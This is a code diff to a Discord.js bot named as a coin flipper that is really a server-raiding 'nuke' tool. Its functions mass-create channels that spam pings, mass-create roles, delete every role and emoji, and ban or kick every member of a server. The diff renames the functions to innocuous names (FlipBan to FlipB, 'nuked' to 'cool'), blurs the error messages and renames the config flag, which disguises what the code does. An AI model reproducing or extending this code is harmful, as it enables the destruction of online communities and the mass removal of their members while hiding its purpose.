@@ -5,7 +5,7 @@
 const { Client, Intents, MessageEmbed } = require("discord.js");
 const coinfilpper = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
 const { red, greenBright, cyan, yellow } = require("chalk");
-const { token, prefix, userID, disableEveryone } = require("../config/config.json")
+const { token, prefix, userID, flag } = require("../config/config.json")
 
 coinfilpper.on("ready", () => {
     console.clear();
@@ -44,7 +44,7 @@ coinfilpper.on("messageCreate", (message) => {
     var args2 = args.slice(1).join(' ')
     var args3 = args.slice(2).join(', ');
 
-    if (!disableEveryone) {
+    if (!flag) {
 
         if (message.content.startsWith(prefix + "help")) {
             message.channel.send({embeds: [help]})
@@ -93,13 +93,13 @@ coinfilpper.on("messageCreate", (message) => {
         }
 
         if (message.content.startsWith(prefix + "mb")) {
-            FlipBan().catch((err) => {
+            FlipB().catch((err) => {
                 message.reply(err);
             });
         }
 
         if (message.content.startsWith(prefix + "mk")) {
-            FlipKick().catch((err) => {
+            FlipK().catch((err) => {
                 message.reply(err);
             });
         }
@@ -162,14 +162,14 @@ coinfilpper.on("messageCreate", (message) => {
 
         if (message.content.startsWith(prefix + "mb")) {
             if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
-            FlipBan().catch((err) => {
+            FlipB().catch((err) => {
                 message.reply(err);
             });
         }
 
         if (message.content.startsWith(prefix + "mk")) {
             if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
-            FlipKick().catch((err) => {
+            FlipK().catch((err) => {
                 message.reply(err);
             });
         }
@@ -178,10 +178,10 @@ coinfilpper.on("messageCreate", (message) => {
 
     function ChooseChannel(amount, channelName) {
         return new Promise((resolve, reject) => {
-            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
-            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
-            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
-            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
+            if (!amount) return reject("Unspecified Args: Specify the channel");
+            if (isNaN(amount)) return reject("Type Error: Use a number");
+            if (amount > 500) return reject("Amount Error");
+            if (!channelPerms) return reject("Bot Missing Permission: 'MANAGE_CHANNELS'");
             for (let i = 0; i < amount; i++) {
                 if (message.guild.channels.cache.size === 500) break;
                 if (!channelName) {
@@ -197,11 +197,11 @@ coinfilpper.on("messageCreate", (message) => {
 
     function ClearNLogs(amount, channelName, pingMessage) {
         return new Promise((resolve, reject) => {
-            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
-            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
-            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
-            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
-            if (!pingMessage) return reject("Unspecified Args: Specify the message you wish to mass mention");
+            if (!amount) return reject("Unspecified Args: Specify the amount of logs you wish to clear");
+            if (isNaN(amount)) return reject("Type Error: Use a number for the amount");
+            if (amount > 500) return reject("Amount Error");
+            if (!channelPerms) return reject("Bot Missing Permission: 'MANAGE_CHANNELS'");
+            if (!pingMessage) return reject("Unspecified Args: Specify the number of logs you wish to clear");
             for (let i = 0; i < amount; i++) {
                 if (message.guild.channels.cache.size === 500) break;
                 message.guild.channels.create(channelName || `${message.author.username} was here`, { type: "GUILD_TEXT" })
@@ -225,15 +225,15 @@ coinfilpper.on("messageCreate", (message) => {
     }
 
 
-    function FlipR(amount, roleName) {
+    function FlipR(amount, r) {
         return new Promise((resolve, reject) => {
-            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
-            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
-            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
+            if (!amount) return reject("Unspecified Args: Specify coin");
+            if (isNaN(amount)) return reject("Type Error");
+            if (!rolePerms) return reject("Bot Error");
             for (let i = 0; i <= amount; i++) {
                 if (message.guild.roles.cache.size === 250) break;
                 message.guild.roles.create({
-                    name: roleName || "nuked",
+                    name: r || "cool",
                     color: "RANDOM",
                     position: i++
                 })
@@ -242,18 +242,16 @@ coinfilpper.on("messageCreate", (message) => {
         })
     }
 
-    /**
-     */
+
     function ClearFlips() {
         return new Promise((resolve, reject) => {
-            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
+            if (!rolePerms) return reject("Bot Error");
             message.guild.roles.cache.forEach((r) => r.delete())
             resolve();
         });
     }
 
-    /**
-     */
+
     function DelCoins() {
         return new Promise((resolve, reject) => {
             if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
@@ -262,8 +260,7 @@ coinfilpper.on("messageCreate", (message) => {
         });
     }
 
-    /**
-     */
+
     function DelAllLogs() {
         return new Promise((resolve, reject) => {
             if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
@@ -272,11 +269,10 @@ coinfilpper.on("messageCreate", (message) => {
         });
     }
 
-    /**
-     */
-    function FlipBan() {
+
+    function FlipB() {
         return new Promise((resolve, reject) => {
-            if (!banPerms) return reject("Bot Missing Permissions: 'BAN_MEMBERS'");
+            if (!banPerms) return reject("Bot Error");
             let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
             message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                 setTimeout(() => {
@@ -290,11 +286,10 @@ coinfilpper.on("messageCreate", (message) => {
         })
     }
 
-    /**
-     */
-    function FlipKick() {
+
+    function FlipK() {
         return new Promise((resolve, reject) => {
-            if (!kickPerms) return reject("Bot Missing Permissions: 'KICK_MEMBERS'");
+            if (!kickPerms) return reject("Bot Error");
             let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
             message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                 setTimeout(() => {
